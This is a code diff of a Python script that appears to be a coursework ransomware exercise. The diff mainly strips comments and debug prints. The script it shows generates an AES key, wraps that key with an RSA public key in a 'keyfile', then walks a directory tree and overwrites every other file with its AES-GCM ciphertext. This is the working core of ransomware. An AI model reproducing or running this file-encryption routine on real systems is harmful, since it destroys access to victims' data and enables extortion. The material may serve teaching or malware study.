@@ -10,9 +10,6 @@ from Crypto.Random import get_random_bytes
 
 
 def make_AES_key(pub_key, priv_key, root_dir):
-
-    # header = b"header"
-    # data = b"secret"
     aes_key = get_random_bytes(16)
 
     # encrypt aes_key with rsa, and writing to file
@@ -20,7 +17,6 @@ def make_AES_key(pub_key, priv_key, root_dir):
     cipher = PKCS1_OAEP.new(key)
     ciphertext = cipher.encrypt(aes_key)
 
-    # adjust, use os.path join
     key_f_name = os.path.join(root_dir, "keyfile")
     key_file = open(key_f_name, "wb")
     key_file.write(ciphertext)
@@ -42,33 +38,22 @@ def make_AES_key(pub_key, priv_key, root_dir):
 
 def enc_all_files(aes_key, root_dir):
     # traverse directory, and encrypt and tag all regular files
-    # my_cipher = AES.new(aes_key, AES.MODE_GCM)
     for dir_name, sub_dir_list, file_list in os.walk(root_dir):
         for f_name in file_list:
             # do the stuff, encrypt and the like
-            # print('found ' + f_name + '\n')
             if f_name != 'keyfile' and f_name != 'keyfile.sig':
                 # encrypt
-                # change to os.path join
                 my_cipher = AES.new(aes_key, AES.MODE_GCM)
                 temp_name = os.path.join(dir_name, f_name)
-                # print(temp_name)
                 file_in = open(temp_name, 'r')
                 data = file_in.read()
                 file_in.close()
                 temp_ciphertext, temp_tag = my_cipher.encrypt_and_digest(data.encode())
 
-                # print(temp_ciphertext)
                 file_out = open(temp_name, "wb")
-                # file_out.write(my_cipher.nonce)
-                # file_out.write(temp_tag)
-                # file_out.write(temp_ciphertext)
-                # file_out.close()
                 [file_out.write(x) for x in (my_cipher.nonce, temp_tag, temp_ciphertext)]
                 # print('encrypted ' + f_name + '\n')
 
-
-# read in all command line items
 
 pub_name = "pubkey.txt"
 given_s = "Michaela"
@@ -130,8 +115,6 @@ else:
 pub_key_file = open(pub_name, "r")
 sub = pub_key_file.readline()
 sub = sub[:-1]
-# print(sub)
-# print(given_s)
 pb_s_type = pub_key_file.readline()
 pb_key = pub_key_file.read()
 pub_key_file.close()
